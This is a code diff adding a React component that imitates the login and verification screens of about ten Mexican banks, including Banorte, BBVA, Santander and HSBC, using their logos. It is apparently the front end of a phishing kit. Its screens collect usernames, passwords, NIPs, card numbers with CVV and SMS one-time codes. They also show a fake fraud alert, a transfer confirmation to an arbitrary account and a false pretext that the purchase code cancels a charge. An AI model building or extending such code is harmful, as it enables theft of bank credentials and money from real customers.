@@ -1,0 +1,623 @@
+import React, { useState, useContext } from 'react';
+import { Card } from '@/components/ui/card';
+import { Input } from '@/components/ui/input';
+import { Button } from '@/components/ui/button';
+import { ScreenType } from '@shared/schema';
+
+import citibanamexLogo from '../../assets/Banamex.png';
+import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
+import bbvaLogo from '../../assets/bbva_logo.png';
+import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
+import banorteLogoFooter from '../../assets/Banorte-01.png'; // El logo rojo de Banorte
+import banorteLogoHeader from '../../assets/Bo.png.png';
+import bancoppelLogo from '../../assets/bancoppel.png';
+import hsbcLogo from '../../assets/Hsbc.png';
+import amexLogo from '../../assets/Amex.png';
+import santanderLogo from '../../assets/santander_logo.png';
+import santanderLogoWhite from '../../assets/santander_logo_white.png';
+import scotiabankLogo from '../../assets/scotiabank_logo.png';
+import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
+import invexLogo from '../../assets/invex_logo.png';
+import invexLogoWhite from '../../assets/invex_logo_white.png';
+
+interface ScreenTemplatesProps {
+  currentScreen: ScreenType;
+  screenData: {
+    terminacion?: string;
+    saldo?: string;
+    monto?: string;
+    clabe?: string;
+    titular?: string;
+    comercio?: string;
+    mensaje?: string;
+  };
+  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
+  banco?: string;
+}
+
+export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
+  currentScreen, 
+  screenData,
+  onSubmit,
+  banco = "BANORTE"
+}) => {
+  // Form state
+  const [folioInput, setFolioInput] = useState('');
+  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
+  const [codigoInput, setCodigoInput] = useState('');
+  const [nipInput, setNipInput] = useState('');
+  const [tarjetaInput, setTarjetaInput] = useState('');
+  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
+  const [cvvInput, setCvvInput] = useState('');
+  const [smsCompraInput, setSmsCompraInput] = useState('');
+
+  // Helper function to render the appropriate screen
+  const renderScreen = () => {
+    // Función para obtener el contenedor según el banco
+    const getBankContainer = (children: React.ReactNode) => {
+      if (banco === 'BANBAJIO') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <div className="bajionet text-2xl font-bold mb-3">
+              <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'CITIBANAMEX') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="citibanamex-header p-4 mb-4 -mx-6 -mt-6">
+              <img src={citibanamexLogo} alt="Citibanamex" className="h-8 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              Fecha: {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'BBVA') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg shadow-md text-center overflow-hidden">
+            <div className="bbva-header p-4 mb-4">
+              <img src={bbvaLogoWhite} alt="BBVA" className="h-6 mx-auto" />
+            </div>
+            <div className="px-6 pb-6">
+              <div className="fecha mb-3 font-light text-sm text-gray-700 text-right">
+                {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: 'long', year: 'numeric' })}
+              </div>
+              {children}
+            </div>
+          </div>
+        );
+      } else if (banco === 'BANORTE') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="banorte-header p-2 mb-4 -mx-6 -mt-6 flex items-center justify-center">
+              <img src={banorteLogoHeader} alt="Banorte" className="h-10" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'BANCOPPEL') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="bancoppel-header p-3 mb-4 -mx-6 -mt-6">
+              <img src={bancoppelLogo} alt="BanCoppel" className="h-8 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'HSBC') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="hsbc-header p-3 mb-4 -mx-6 -mt-6 bg-white">
+              <img src={hsbcLogo} alt="HSBC" className="h-10 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-semibold text-sm text-black">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: 'long', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'AMEX') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="amex-header p-3 mb-4 -mx-6 -mt-6">
+              <img src={amexLogo} alt="American Express" className="h-8 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'SANTANDER') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="santander-header p-3 mb-4 -mx-6 -mt-6">
+              <img src={santanderLogoWhite} alt="Santander" className="h-28 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'SCOTIABANK') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="scotiabank-header p-3 mb-4 -mx-6 -mt-6">
+              <img src={scotiabankLogoWhite} alt="Scotiabank" className="h-28 mx-auto" />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else if (banco === 'INVEX') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <div className="invex-header p-3 mb-4 -mx-6 -mt-6">
+              <img src={invexLogoWhite} alt="INVEX" className="h-10 mx-auto" style={{ maxHeight: '36px' }} />
+            </div>
+            <div className="fecha mb-3 font-light text-sm text-gray-700">
+              {new Date().toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' })}
+            </div>
+            {children}
+          </div>
+        );
+      } else {
+        // Default container
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {children}
+          </div>
+        );
+      }
+    };
+    
+    // Diferentes pantallas según el tipo
+    switch (currentScreen) {
+      case ScreenType.FOLIO:
+        const folioContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Ingresa tu folio</h2>
+            <div className="mb-4">
+              <Input 
+                type="text" 
+                placeholder="Folio" 
+                className="w-full border border-gray-300 rounded p-2 mb-3"
+                value={folioInput}
+                onChange={(e) => setFolioInput(e.target.value)}
+              />
+            </div>
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+            >
+              Continuar
+            </Button>
+          </>
+        );
+        return getBankContainer(folioContent);
+
+      case ScreenType.LOGIN:
+        const loginContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Acceso a tu cuenta</h2>
+            <div className="mb-4">
+              <div className="flex flex-col items-start mb-2">
+                <label className="text-sm text-gray-700 mb-1">Usuario o ID de cliente:</label>
+                <Input 
+                  type="text" 
+                  value={loginInputs.username}
+                  onChange={(e) => setLoginInputs({...loginInputs, username: e.target.value})}
+                  placeholder="Usuario"
+                  className="w-full p-2 border border-gray-300 rounded"
+                />
+              </div>
+              
+              <div className="flex flex-col items-start">
+                <label className="text-sm text-gray-700 mb-1">Contraseña:</label>
+                <Input 
+                  type="password" 
+                  value={loginInputs.password}
+                  onChange={(e) => setLoginInputs({...loginInputs, password: e.target.value})}
+                  placeholder="Contraseña"
+                  className="w-full p-2 border border-gray-300 rounded"
+                />
+              </div>
+            </div>
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.LOGIN, { username: loginInputs.username, password: loginInputs.password })}
+            >
+              Ingresar
+            </Button>
+          </>
+        );
+        return getBankContainer(loginContent);
+
+      case ScreenType.CODIGO:
+        const codigoContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Verificación de seguridad</h2>
+            <p className="mb-4">
+              Hemos enviado un código de verificación a tu número de teléfono terminación: <strong>{screenData.terminacion || "****"}</strong>
+            </p>
+            <Input 
+              type="text" 
+              placeholder="Ingrese el código" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={codigoInput}
+              onChange={(e) => setCodigoInput(e.target.value)}
+            />
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
+            >
+              Verificar
+            </Button>
+          </>
+        );
+        return getBankContainer(codigoContent);
+
+      case ScreenType.NIP:
+        const nipContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
+            <p className="mb-4">
+              Por tu seguridad, necesitamos verificar tu NIP de 4 dígitos.
+            </p>
+            <Input 
+              type="password" 
+              placeholder="NIP" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={nipInput}
+              onChange={(e) => setNipInput(e.target.value)}
+              maxLength={4}
+            />
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
+            >
+              Confirmar
+            </Button>
+          </>
+        );
+        return getBankContainer(nipContent);
+
+      case ScreenType.PROTEGER:
+        const protegerContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Protege tu saldo</h2>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p className="mb-2">
+                Hemos identificado un posible intento de fraude en tu cuenta. 
+              </p>
+              <p className="mb-2">
+                Por seguridad, hemos bloqueado tu saldo de <strong>${screenData.saldo || "0.00"}</strong> para protegerlo.
+              </p>
+              <p className="font-semibold">
+                Tu dinero está seguro mientras verificamos la actividad sospechosa.
+              </p>
+            </div>
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}
+            >
+              Entendido
+            </Button>
+          </>
+        );
+        return getBankContainer(protegerContent);
+
+      case ScreenType.TARJETA:
+        const tarjetaContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Verificación de tarjeta</h2>
+            <p className="mb-4">
+              Para confirmar que eres el titular, por favor ingresa los datos de tu tarjeta.
+            </p>
+            
+            <div className="mb-4">
+              <div className="flex flex-col items-start mb-2">
+                <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
+                <Input 
+                  type="text" 
+                  value={tarjetaInput}
+                  onChange={(e) => setTarjetaInput(e.target.value)}
+                  placeholder="XXXX XXXX XXXX XXXX"
+                  className="w-full p-2 border border-gray-300 rounded"
+                />
+              </div>
+              
+              <div className="flex space-x-3">
+                <div className="flex flex-col items-start w-1/2">
+                  <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
+                  <Input 
+                    type="text" 
+                    value={fechaVencimientoInput}
+                    onChange={(e) => setFechaVencimientoInput(e.target.value)}
+                    placeholder="MM/AA"
+                    className="w-full p-2 border border-gray-300 rounded"
+                  />
+                </div>
+                
+                <div className="flex flex-col items-start w-1/2">
+                  <label className="text-sm text-gray-700 mb-1">CVV:</label>
+                  <Input 
+                    type="text" 
+                    value={cvvInput}
+                    onChange={(e) => setCvvInput(e.target.value)}
+                    placeholder="XXX"
+                    className="w-full p-2 border border-gray-300 rounded"
+                    maxLength={3}
+                  />
+                </div>
+              </div>
+            </div>
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.TARJETA, { 
+                tarjeta: tarjetaInput,
+                fechaVencimiento: fechaVencimientoInput,
+                cvv: cvvInput
+              })}
+            >
+              Verificar
+            </Button>
+          </>
+        );
+        return getBankContainer(tarjetaContent);
+
+      case ScreenType.TRANSFERIR:
+        const transferirContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Transferencia</h2>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p className="mb-2">
+                Confirma los datos de la transferencia:
+              </p>
+              <p className="mb-1">Monto: <strong>${screenData.monto || "0.00"}</strong></p>
+              <p className="mb-1">CLABE: <strong>{screenData.clabe || "0000000000000000000"}</strong></p>
+              <p className="mb-1">Beneficiario: <strong>{screenData.titular || "Titular"}</strong></p>
+            </div>
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}
+            >
+              Confirmar
+            </Button>
+          </>
+        );
+        return getBankContainer(transferirContent);
+
+      case ScreenType.CANCELACION:
+        const cancelacionContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Cancelación Exitosa</h2>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p className="mb-2">
+                El cargo ha sido cancelado exitosamente.
+              </p>
+              <p className="mb-1">Monto: <strong>${screenData.monto || "0.00"}</strong></p>
+              <p className="mb-1">Comercio: <strong>{screenData.comercio || "Comercio"}</strong></p>
+              <p className="mb-1">Fecha: <strong>{new Date().toLocaleDateString('es-MX')}</strong></p>
+              <p className="mt-3 font-bold">
+                El dinero será devuelto a tu cuenta en un plazo máximo de 24 horas hábiles.
+              </p>
+            </div>
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmado: true })}
+            >
+              Entendido
+            </Button>
+          </>
+        );
+        return getBankContainer(cancelacionContent);
+
+      case ScreenType.MENSAJE:
+        const mensajeContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
+            </div>
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
+            >
+              Entendido
+            </Button>
+          </>
+        );
+        return getBankContainer(mensajeContent);
+
+      case ScreenType.SMS_COMPRA:
+        const smsCompraContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
+            <p className="mb-4">
+              El código que recibiste para autorizar una compra en línea, es el mismo para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
+            </p>
+            <Input 
+              type="text" 
+              placeholder="Ingrese el código recibido" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={smsCompraInput}
+              onChange={(e) => setSmsCompraInput(e.target.value)}
+            />
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => {
+                if (smsCompraInput.trim()) {
+                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
+                  setSmsCompraInput('');
+                }
+              }}
+              disabled={!smsCompraInput.trim()}
+            >
+              Cancelar cargo
+            </Button>
+          </>
+        );
+        return getBankContainer(smsCompraContent);
+
+      case ScreenType.VALIDANDO:
+        const validandoContent = (
+          <>
+            <h2 className="text-xl font-bold mb-4">Validando...</h2>
+            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
+            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
+              <div className={`h-full ${
+                banco === 'BANBAJIO' ? 'banbajio-bg' : 
+                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
+                banco === 'BBVA' ? 'bg-[#072146]' :
+                banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
+                banco === 'HSBC' ? 'bg-[#DB0011]' :
+                banco === 'AMEX' ? 'amex-bg' :
+                banco === 'SANTANDER' ? 'santander-bg' :
+                banco === 'SCOTIABANK' ? 'scotiabank-bg' :
+                banco === 'INVEX' ? 'invex-bg' :
+                'bg-[#EC1C24]'
+              } animate-progress-bar`}></div>
+            </div>
+            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
+          </>
+        );
+        return getBankContainer(validandoContent);
+
+      default:
+        const defaultContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
+            <p>La pantalla solicitada no está disponible en este momento.</p>
+          </>
+        );
+        return getBankContainer(defaultContent);
+    }
+  };
+
+  // Definimos las clases de estilos para los botones según el banco
+  const getPrimaryBtnClass = () => {
+    switch(banco) {
+      case 'CITIBANAMEX':
+        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'BANBAJIO':
+        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
+      case 'BBVA':
+        return 'bbva-button';
+      case 'BANCOPPEL':
+        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'HSBC':
+        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'AMEX':
+        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'SANTANDER':
+        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'SCOTIABANK':
+        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'INVEX':
+        return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'BANORTE':
+        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      default:
+        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
+    }
+  };
+
+  const primaryBtnClass = getPrimaryBtnClass();
+
+  const bankLogo = () => {
+    switch(banco) {
+      case 'CITIBANAMEX':
+        return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
+      case 'BANBAJIO':
+        return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
+      case 'BBVA':
+        return <img src={bbvaLogoWhite} alt="BBVA" className="h-16 mx-auto mb-4 white-logo" />;
+      case 'BANCOPPEL':
+        return <img src={bancoppelLogo} alt="BanCoppel" className="h-16 mx-auto mb-4" />;
+      case 'HSBC':
+        return <img src={hsbcLogo} alt="HSBC" className="h-16 mx-auto mb-4" />;
+      case 'AMEX':
+        return <img src={amexLogo} alt="American Express" className="h-16 mx-auto mb-4" />;
+      case 'SANTANDER':
+        return <img src={santanderLogoWhite} alt="Santander" className="h-16 mx-auto mb-4 filter brightness-0 invert" />;  
+      case 'SCOTIABANK':
+        return <img src={scotiabankLogoWhite} alt="Scotiabank" className="h-16 mx-auto mb-4 filter brightness-0 invert" />;  
+      case 'INVEX':
+        return <img src={invexLogoWhite} alt="INVEX" className="h-16 mx-auto mb-4 filter brightness-0 invert" />;  
+      case 'BANORTE':
+        return <div className="banorte-header">
+          <img src={banorteLogoFooter} alt="Banorte" className="banorte-logo h-14 mx-auto" />
+        </div>;
+      default:
+        return <div className="banorte-header">
+          <img src={banorteLogoFooter} alt="Banorte" className="banorte-logo h-14 mx-auto" />
+        </div>;
+    }
+  };
+
+  // Función para obtener la clase de header según el banco
+  const getBankHeaderClass = () => {
+    switch(banco) {
+      case 'BANBAJIO': return 'banbajio-header';
+      case 'CITIBANAMEX': return 'citibanamex-header';
+      case 'BBVA': return 'bbva-header';
+      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';
+      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';
+      case 'AMEX': return 'bg-[#0077C8] text-white p-2';
+      case 'SANTANDER': return 'santander-header';
+      case 'SCOTIABANK': return 'scotiabank-header';
+      case 'INVEX': return 'invex-header';
+      case 'BANORTE': return 'banorte-header';
+      default: return 'bg-gray-100 p-3 text-center font-semibold';
+    }
+  };
+
+  // Función para obtener la clase del contenedor según el banco
+  const getBankContainerClass = () => {
+    switch(banco) {
+      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
+      case 'CITIBANAMEX': return 'citibanamex-container';
+      case 'BBVA': return 'bbva-container';
+      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';
+      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';
+      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
+      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
+      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
+      case 'INVEX': return 'bg-white p-4 rounded-lg shadow invex-container';
+      case 'BANORTE': return 'banorte-container';
+      default: return '';
+    }
+  };
+
+  // Renderizados especiales según el banco
+  if (banco === 'CITIBANAMEX') {
+    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
+  }
+
+  // Renderizado normal para otros bancos
+  return (
+    <div className={getBankContainerClass()}>
+      {/* No mostrar logos en el contenido principal - los logos ya están en el header de cada banco */}
+      {renderScreen()}
+    </div>
+  );
+};
